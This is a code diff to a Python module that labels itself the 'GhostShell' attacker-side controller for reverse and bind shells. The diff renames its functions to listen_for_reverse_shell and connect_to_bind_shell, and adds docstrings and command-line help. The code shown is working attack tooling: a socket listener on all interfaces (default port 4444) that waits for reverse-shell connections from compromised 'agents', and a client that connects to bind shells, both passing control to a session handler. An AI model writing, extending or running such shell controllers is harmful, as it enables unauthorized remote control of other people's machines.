@@ -1,5 +1,9 @@
+"""
+GhostShell Client Module
+Attacker-side controller for managing reverse shells and bind shells.
+"""
+
 import socket
-import argparse
 import sys
 import threading
 import time
@@ -58,23 +62,25 @@ def handle_session(sock):
     finally:
         sock.close()
 
-def start_server(port):
+def listen_for_reverse_shell(port):
+    """Listen for incoming reverse shell connections from agent."""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind(("0.0.0.0", port))
     s.listen(1)
-    print(f"[*] Controller V2 listening on {port}...")
+    print(f"[*] Listening on 0.0.0.0:{port} for reverse shell...")
     
     try:
         conn, addr = s.accept()
-        print(f"[+] Connection from {addr[0]}")
+        print(f"[+] Connection from {addr[0]}:{addr[1]}!")
         handle_session(conn)
     except KeyboardInterrupt:
-        pass
+        print("\n[*] Listener stopped.")
     finally:
         s.close()
 
-def connect_to_target(ip, port):
+def connect_to_bind_shell(ip, port):
+    """Connect to an agent running a bind shell."""
     print(f"[*] Connecting to {ip}:{port}...")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -84,22 +90,26 @@ def connect_to_target(ip, port):
     except Exception as e:
         print(f"[!] Connection failed: {e}")
 
+# --- ENTRY POINT FOR DIRECT EXECUTION ---
+
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser()
+    import argparse
+    
+    parser = argparse.ArgumentParser(description="GhostShell Client - Attacker Controller")
     subparsers = parser.add_subparsers(dest="mode")
     
-    listen = subparsers.add_parser("listen")
+    listen = subparsers.add_parser("listen", help="Listen for reverse shell")
     listen.add_argument("--port", type=int, default=4444)
     
-    connect = subparsers.add_parser("connect")
+    connect = subparsers.add_parser("connect", help="Connect to bind shell")
     connect.add_argument("ip")
     connect.add_argument("port", type=int)
     
     args = parser.parse_args()
     
     if args.mode == "listen":
-        start_server(args.port)
+        listen_for_reverse_shell(args.port)
     elif args.mode == "connect":
-        connect_to_target(args.ip, args.port)
+        connect_to_bind_shell(args.ip, args.port)
     else:
         parser.print_help()
